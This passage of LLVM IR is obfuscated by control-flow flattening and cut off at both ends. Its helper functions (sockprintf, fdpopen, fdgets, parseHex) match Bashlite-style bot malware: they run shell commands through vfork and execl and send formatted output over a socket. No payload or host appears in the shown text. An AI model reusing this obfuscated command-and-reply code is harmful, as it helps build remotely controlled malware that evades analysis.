  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 1633498592, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 1609548454, i32 -1219564553
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -1052791529, i32 123538288
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 -1078691139, i32 123538288
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -1809861956, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -1809861956, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 -1219564553, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 796504123, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 -264782351, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -264782351, label %first
    i32 797528456, label %8
    i32 -108736901, label %16
    i32 1077865839, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 797528456, i32 -108736901
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 1077865839, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 1077865839, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -781642882, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -781642882, label %first
    i32 955972860, label %15
    i32 -851561420, label %21
    i32 -900152786, label %28
    i32 -164348240, label %29
    i32 278594113, label %34
    i32 -277747478, label %35
    i32 -1393434043, label %39
    i32 -617200051, label %43
    i32 1674595618, label %44
    i32 2066231192, label %54
    i32 -1226280653, label %55
    i32 -52354377, label %61
    i32 -68765570, label %NodeBlock
    i32 790308904, label %LeafBlock1
    i32 1619258240, label %LeafBlock
    i32 -394747641, label %66
    i32 -856520123, label %73
    i32 -1336875314, label %79
    i32 1061893903, label %84
    i32 -624529949, label %91
    i32 -1801840164, label %95
    i32 -1473662120, label %100
    i32 -1430822238, label %107
    i32 -1582438949, label %111
    i32 -1741822111, label %NewDefault
    i32 48401961, label %114
    i32 -729406028, label %120
    i32 -101999227, label %126
    i32 275039341, label %132
    i32 -1923830519, label %139
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 955972860, i32 -851561420
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 -900152786, i32 -851561420
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 -900152786, i32 -164348240
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1923830519, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %31 = call i32 @pipe(i32* %30) #2
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 278594113, i32 -277747478
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1923830519, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 -1393434043, i32 -52354377
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #2
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 -617200051, i32 1674595618
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1923830519, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #2
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 2066231192, i32 -1226280653
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1923830519, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 -52354377, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 -68765570, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 1619258240, i32 790308904
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 -856520123, i32 -1741822111
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 -394747641, i32 -1741822111
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 -1923830519, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 -1336875314, i32 -1801840164
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 1061893903, i32 -624529949
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #2
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 -624529949, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 -1582438949, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 -1473662120, i32 -1430822238
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #2
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 -1430822238, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1582438949, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.131, i32 0, i32 0), i8* %112, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 48401961, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 114
  %119 = select i1 %118, i32 -729406028, i32 -101999227
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %122 = load i32, i32* %121, align 4
  store i32 %122, i32* %6, align 4
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @close(i32 %124)
  store i32 275039341, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %128 = load i32, i32* %127, align 4
  store i32 %128, i32* %6, align 4
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  store i32 275039341, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %9, align 4
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  %138 = load i32, i32* %6, align 4
  store i32 %138, i32* %3, align 4
  store i32 -1923830519, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %3, align 4
  ret i32 %140

loopEnd:                                          ; preds = %132, %126, %120, %114, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 358806661, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 358806661, label %first
    i32 -983814085, label %13
    i32 1489428816, label %21
    i32 -1086970254, label %22
    i32 222031746, label %30
    i32 596938151, label %37
    i32 313283613, label %41
    i32 -1276717862, label %45
    i32 572359688, label %47
    i32 -1129041212, label %56
    i32 -1873889838, label %57
    i32 -1871429466, label %64
    i32 -1058790609, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 1489428816, i32 -983814085
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 1489428816, i32 -1086970254
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -1058790609, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  store i32 222031746, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 596938151, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 313283613, i32 -1276717862
  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 -1276717862, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 222031746, i32 572359688
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 -1129041212, i32 -1873889838
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 -1871429466, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 -1871429466, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 -1058790609, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -494880279, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -494880279, label %9
    i32 1120561638, label %13
    i32 -1670360967, label %18
    i32 17939137, label %27
    i32 -947455264, label %29
    i32 -1537176349, label %39
    i32 1090352565, label %43
    i32 -1666163480, label %44
    i32 60867086, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 1120561638, i32 17939137
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 -1670360967, i32 17939137
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 17939137, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 -947455264, i32 -1537176349
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 -494880279, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 1090352565, i32 -1666163480
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 60867086, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 60867086, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 -791780315, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -791780315, label %4
    i32 973370389, label %10
    i32 196206910, label %13
    i32 -2127412481, label %15
    i32 -1766641995, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 973370389, i32 196206910
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 196206910, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 -2127412481, i32 -1766641995
  store i32 %14, i32* %switchVar
